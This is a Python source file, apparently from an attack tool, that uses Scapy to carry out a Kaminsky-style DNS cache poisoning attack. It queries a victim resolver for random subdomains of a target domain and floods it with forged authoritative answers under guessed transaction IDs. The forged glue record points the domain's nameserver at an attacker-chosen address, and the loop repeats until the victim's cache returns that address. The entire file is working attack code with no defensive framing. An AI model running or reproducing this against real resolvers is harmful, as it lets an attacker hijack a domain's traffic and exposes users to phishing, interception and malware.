from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, send
import utils
from vars import ccolors
import datetime

def loud(args):
    poisoned = False

    # first packet sent to the victim NS to start the recursive domain to ip resolution
    reqPkt = IP(dst=args.victim) / UDP(sport=53) / DNS(qr=0, qd=DNSQR(qname=""))
    # fake answer to the query
    fakeANRR = DNSRR(rrname="", type='A', rdata=utils.getRandomIPv4())
    # authoritative record
    realNSRR = DNSRR(rrname=args.targetDomain,  type='NS', rdata=args.soaDomain[0], ttl=args.ttl)
    # fake additional record (glue)
    fakeARR = DNSRR(rrname=args.soaDomain[0], type='A', rdata=args.addressToForge, ttl=args.ttl)
    # actual "response" packet that will flood the victim
    resPkt = IP(dst=args.victim) / UDP(sport=53) / DNS(aa=1, qr=1, qd=DNSQR(qname=""), an=fakeANRR, ns=realNSRR, ar=fakeARR)

    while not poisoned:
        # generate random subdomain, i.e. 1234www5678.example.com
        queryDomain = utils.getRandomSubdomain() + args.targetDomain

        # send the query with the target domain to the victim
        reqPkt[DNS].qd.qname = queryDomain
        send(reqPkt, verbose=False)

        resPkt[DNS].an.rrname = queryDomain
        resPkt[DNS].qd.qname = queryDomain
        for _ in xrange(30): # stream of 30 forged packets (TODO: test if the amount is right)
            resPkt[DNS].id = utils.getRandomTXID()
            send(resPkt, verbose=False)

        # ask the victim for the IP of the domain we are trying to spoof
        pkt = sr1(IP(dst=args.victim) / UDP(sport=53) / DNS(qr=0, qd=DNSQR(qname=args.soaDomain[0], qtype='A')), verbose=False)
        if pkt[DNS].an and pkt[DNS].an.rdata:
            actualAnswer = str(pkt[DNS].an.rdata)
            # if the IP is our IP, we poisoned the victim
            if actualAnswer == args.addressToForge:
                poisoned = True

    print ccolors.OKGREEN + 'Poisoned now!\n' + ccolors.NC

    deltaTime = datetime.datetime.now() - args.startTime

    print ccolors.WARNING + 'It took: ' + str(deltaTime) + ccolors.NC
